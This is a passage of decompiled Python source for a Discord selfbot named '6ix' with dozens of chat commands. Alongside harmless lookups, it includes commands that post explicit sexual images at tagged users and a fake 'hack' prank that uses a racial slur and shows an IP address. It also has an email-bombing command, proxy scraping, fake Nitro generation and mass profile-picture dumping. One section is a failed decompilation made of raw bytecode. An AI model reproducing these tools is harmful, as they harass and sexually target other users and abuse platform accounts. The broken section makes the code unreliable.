        await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} All matchings, you won!"})), color=(discord.Color(random.randint(0, 16777215))))
    elif a == b or a == c or b == c:
        await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} 2 in a row, you won!"})), color=(discord.Color(random.randint(0, 16777215))))
    else:
        await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} No match, you lost"})), color=(discord.Color(random.randint(0, 16777215))))


@SIX.command()
async def joke(ctx):
    await ctx.message.delete()
    headers = {'Accept': 'application/json'}
    async with aiohttp.ClientSession() as session:
        async with session.get('https://icanhazdadjoke.com', headers=headers) as req:
            r = await req.json()
    await ctx.send(r['joke'])


@SIX.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid):
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1
            channel = SIX.get_channel(int(channelid))
            await channel.send('!d bump')
            print(f"{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent" + Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            try:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
            finally:
                e = None
                del e


@SIX.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=(discord.File(buff, f"{message}.wav")))


@SIX.command()
async def upper(ctx, *, message):
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)


@SIX.command(aliases=['guildpfp'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=(ctx.guild.name), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(ctx.guild.icon_url))
    await ctx.send(embed=em)


@SIX.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx):
    await ctx.message.delete()
    for friend in SIX.user.friends:
        friendlist = friend.name + '#' + friend.discriminator
        with open('Backup/Friends.txt', 'a+') as f:
            f.write(friendlist + '\n')
    else:
        for block in SIX.user.blocked:
            blocklist = block.name + '#' + block.discriminator
            with open('Backup/Blocked.txt', 'a+') as f:
                f.write(blocklist + '\n')


@SIX.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel=None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=(first_message.content), color=(discord.Color(random.randint(0, 16777215))))
    embed.add_field(name='First Message', value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)


@SIX.command()
async def mac(ctx, mac):
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result', description=(r.text), colour=14593471)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)


@SIX.command()
async def hack(ctx, user: discord.Member):
    await ctx.message.delete()
    PORN = ['Hacking', 'getting ' + user.mention + ' info', 'this goofy nigga lives in his granny basement', 'almost done hacking...', 'his ip 195.58.156.21', 'sending to the 6ix head quarters...', 'done.']
    message = await ctx.send(PORN[0])
    await asyncio.sleep(3)
    for _next in PORN[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@SIX.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`", color=(discord.Color(random.randint(0, 16777215))))
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@SIX.command(aliases=['ethereum'])
async def eth(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`", color=(discord.Color(random.randint(0, 16777215))))
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)


@SIX.command()
async def topic(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id='random').text
    await ctx.send(topic)


@SIX.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f"{qa}\n{qor}\n{qb}", color=(discord.Color(random.randint(0, 16777215))))
    await ctx.send(embed=em)


@SIX.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post('https://hastebin.com/documents', data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@SIX.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")


@SIX.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/cuddle')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *cuddling with*  ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def anal(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/anal')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *did anal with* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def cum(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/cum')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *busted a nut inside* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def poke(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/poke')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *wants attention* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def fuck(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/Random_hentai_gif')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *fucked* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def boobs(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/boobs')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *is playing with* ' + user.mention + ' *boobs*'), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def head(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/blowjob')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *gave* ' + user.mention + ' *head*'), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def lesbian(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/les')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *and* ' + user.mention + ' *are having lesbian sex*'), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/feed')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *is feeding*  ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/tickle')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *tickling*  ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def lick(ctx, user: discord.Member):
    await ctx.message.delete()
    em = discord.Embed(description=(SIX.user.name + ' *licked*  ' + user.mention), color=0)
    (em.set_image(url='https://media1.tenor.com/images/efd46743771a78e493e66b5d26cd2af1/tenor.gif?itemid=14002773'),)
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/slap')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *slapped*  ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/hug')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *hugged* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/smug')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *smugged at* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/pat')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *just gave u a pat* ' + user.mention + ' *for being good :)*'), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/kiss')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *gave u a smooch* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def sex(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/Random_hentai_gif')
    res = r.json()
    em = discord.Embed(description=(SIX.user.name + ' *having sex with* ' + user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(res['url']))
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command()
async def kill(ctx, user: discord.Member):
    await ctx.message.delete()
    em = discord.Embed(description=(SIX.user.name + ' *killed*  ' + user.mention), color=0)
    (em.set_image(url='https://thumbs.gfycat.com/BossyMenacingCavy-small.gif'),)
    em.set_footer(text='6ix selfbot', icon_url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    await ctx.send(embed=em)


@SIX.command(aliases=['proxy'])
async def proxies(ctx):
    await ctx.message.delete()
    file = open('Data/Http-proxies.txt', 'a+')
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)

    for p in proxies:
        file.write(p + '\n')
    else:
        file = open('Data/Https-proxies.txt', 'a+')
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)

        for p in proxies:
            file.write(p + '\n')
        else:
            file = open('Data/Socks4-proxies.txt', 'a+')
            res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
            proxies = []
            for proxy in res.text.split('\n'):
                proxy = proxy.strip()
                if proxy:
                    proxies.append(proxy)

            for p in proxies:
                file.write(p + '\n')
            else:
                file = open('Data/Socks5-proxies.txt', 'a+')
                res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
                proxies = []
                for proxy in res.text.split('\n'):
                    proxy = proxy.strip()
                    if proxy:
                        proxies.append(proxy)
                else:
                    for p in proxies:
                        file.write(p + '\n')


@SIX.command()
async def uptime(ctx):
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send('`' + uptime + '`')


@SIX.command()
async def purge--- This code section failed: ---

 L.2544         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.2545        16  LOAD_FAST                'ctx'
               18  LOAD_ATTR                message
               20  LOAD_ATTR                channel
               22  LOAD_ATTR                history
               24  LOAD_FAST                'amount'
               26  LOAD_CONST               ('limit',)
               28  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               30  LOAD_METHOD              filter
               32  LOAD_LAMBDA              '<code_object <lambda>>'
               34  LOAD_STR                 'purge.<locals>.<lambda>'
               36  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               38  CALL_METHOD_1         1  ''
               40  LOAD_METHOD              map
               42  LOAD_LAMBDA              '<code_object <lambda>>'
               44  LOAD_STR                 'purge.<locals>.<lambda>'
               46  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               48  CALL_METHOD_1         1  ''
               50  GET_AITER        
             52_0  COME_FROM            96  '96'
             52_1  COME_FROM            92  '92'
             52_2  COME_FROM            82  '82'
               52  SETUP_FINALLY        98  'to 98'
               54  GET_ANEXT        
               56  LOAD_CONST               None
               58  YIELD_FROM       
               60  POP_BLOCK        
               62  STORE_FAST               'message'

 L.2546        64  SETUP_FINALLY        84  'to 84'

 L.2547        66  LOAD_FAST                'message'
               68  LOAD_METHOD              delete
               70  CALL_METHOD_0         0  ''
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          
               80  POP_BLOCK        
               82  JUMP_BACK            52  'to 52'
             84_0  COME_FROM_FINALLY    64  '64'

 L.2548        84  POP_TOP          
               86  POP_TOP          
               88  POP_TOP          

 L.2549        90  POP_EXCEPT       
               92  JUMP_BACK            52  'to 52'
               94  END_FINALLY      
               96  JUMP_BACK            52  'to 52'
             98_0  COME_FROM_FINALLY    52  '52'
               98  END_ASYNC_FOR    

Parse error at or near `JUMP_BACK' instruction at offset 92


@SIX.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in SIX.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@SIX.command()
async def setS(ctx, *, message):
    await ctx.message.delete()
    em = discord.Embed(description='', color=8388736)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    em.add_field(name='**Youre Status Has Changed To Streaming**', value=':white_check_mark:', inline=False)
    await ctx.send(embed=em)
    stream = discord.Streaming(name=message,
      url=stream_url)
    await SIX.change_presence(activity=stream)


@SIX.command()
async def setG(ctx, *, message):
    await ctx.message.delete()
    em = discord.Embed(description='', color=32768)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    em.add_field(name='**Youre Status Has Changed To Playing**', value=':white_check_mark:', inline=False)
    await ctx.send(embed=em)
    game = discord.Game(name=message)
    await SIX.change_presence(activity=game)


@SIX.command()
async def setL(ctx, *, message):
    await ctx.message.delete()
    em = discord.Embed(description='', color=32768)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    em.add_field(name='**Youre Status Has Changed To Listening**', value=':white_check_mark:', inline=False)
    await ctx.send(embed=em)
    await SIX.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening),
      name=message))


@SIX.command()
async def setW(ctx, *, message):
    await ctx.message.delete()
    em = discord.Embed(description='', color=32768)
    em.set_image(url='https://cdn.discordapp.com/avatars/695571997740105769/a_097a43faebf6b4f3cb14c5b95b689c16.gif?size=128')
    em.set_footer(text='6ix selfbot', icon_url=(ctx.author.avatar_url))
    em.add_field(name='**Youre Status Has Changed To Watching**', value=':white_check_mark:', inline=False)
    await ctx.send(embed=em)
    await SIX.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching),
      name=message))


@SIX.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in SIX.guilds:
        await guild.ack()


@SIX.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@SIX.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@SIX.command()
async def secret(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@SIX.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


@SIX.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx):
    await ctx.message.delete()
    print(f"HWID: LIGHTYELLOW_EX{hwid}" + Fore.RESET)


@SIX.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))


@SIX.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')


@SIX.command()
async def logout(ctx):
    await ctx.message.delete()
    await SIX.logout()


@SIX.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):
    await ctx.message.delete()
    btc_status.start()


@SIX.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx):
    await ctx.message.delete()
    Dump(ctx)


@SIX.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx):
    await ctx.message.delete()
    Clear()


@SIX.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


@SIX.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
    await ctx.message.delete()
    GmailBomber()


@SIX.command(name='soff', aliases=['status-off', 'Soff'])
async def statusoff(ctx):
    await SIX.change_presence(status=(discord.Status.online))
    await ctx.message.delete()


if __name__ == '__main__':
    Init()